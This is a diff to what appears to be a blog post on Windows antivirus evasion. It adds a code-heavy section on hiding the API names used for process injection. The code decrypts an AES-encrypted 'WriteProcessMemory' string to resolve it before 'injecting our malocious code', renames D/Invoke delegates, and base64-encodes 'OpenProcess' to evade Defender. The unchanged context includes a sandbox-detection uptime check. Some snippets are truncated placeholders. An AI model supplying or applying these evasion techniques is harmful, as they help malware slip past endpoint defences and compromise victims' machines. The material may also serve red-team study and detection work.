@@ -129,15 +129,101 @@ signtool sign /v /f SPC.pfx <executable>
 
 ## Add AES String Encryption
 
-2) `Add AES paylod Encryption`
+## 1) AES String Encryption 
+
+`Add AES paylod Encryption`
+
+First of all we need the function to apply AES encryption/decryption 
+
+```cpp
+
+//AES ENC
+int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
+        HCRYPTPROV hProv;
+        HCRYPTHASH hHash;
+        HCRYPTKEY hKey;
+
+        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
+                return -1;
+        }
+        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
+                return -1;
+        }
+        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
+                return -1;              
+        }
+        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
+                return -1;
+        }
+        
+        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
+                return -1;
+        }
+        
+        CryptReleaseContext(hProv, 0);
+        CryptDestroyHash(hHash);
+        CryptDestroyKey(hKey);
+        
+        return 0;
+}
+```
+
+We then need to declare our encptyted WIN API function:
+
+```cpp
+unsigned char sWriteProcessMemory[] = { 0xac, 0x40, 0xc4, 0xf9, 0x13, .... };
+``` 
+
+To generate the encrypted function use the imported python scritp (add link to github)
+
+```py
+c=aesenc("WriteProcessMemory\x00","addyourkey")
+print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in c) + ' };')
+payload[] = { 0x6, 0xea, 0x85, 0x3e, ..... };
+```
 
 
-<p align="center">
-  <img src="/assets/posts/2021-03-01-Windows-Evasion/strcs.JPG">
-</p>
+We will then decrypt the function pointer before injecting our malocious code. 
+
+```cpp
+AESDecrypt((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key, sizeof(key));
+pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"), sWriteProcessMemory);
+```
 
 
-__Note:__ A basic c# base64 string obfuscation
+In order to evade defender it is possible to change delegate names and implement base64 encoding of API strings
+
+
+#### 2) Change of delegate names
+
+Intended D/Invoke way:
+```cpp
+[UnmanagedFunctionPointer(CallingConvention.StdCall)]
+delegate IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+```
+
+Obfuscated way:
+```cpp
+[UnmanagedFunctionPointer(CallingConvention.StdCall)]
+delegate IntPtr OpPr(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+```
+
+#### Change of API method pointer query
+
+Intended D/Invoke way:
+```cpp
+var pointer = Generic.GetLibraryAddress("kernel32.dll", "OpenProcess");
+```
+Obfuscated way:
+```cpp
+string op = "T3BlblByb2Nlc3M="; // echo -n "OpenProcess" | base64
+byte[] openc = System.Convert.FromBase64String(op);
+string opdec = Encoding.UTF8.GetString(openc);
+var pointer = Generic.GetLibraryAddress("kernel32.dll", opdec);
+```
+
+
+
 
 ## Anti analysis defenses
 
@@ -164,7 +250,7 @@ __IMG 1:__ Checking CPU
 
 __IMG 2:__ Checking RAM
 
-```cpp
+```	cpp
 	ULONGLONG uptime = GetTickCount64() / 1000;
 	if (uptime < 1200) return 0; //20 minutes
 ```
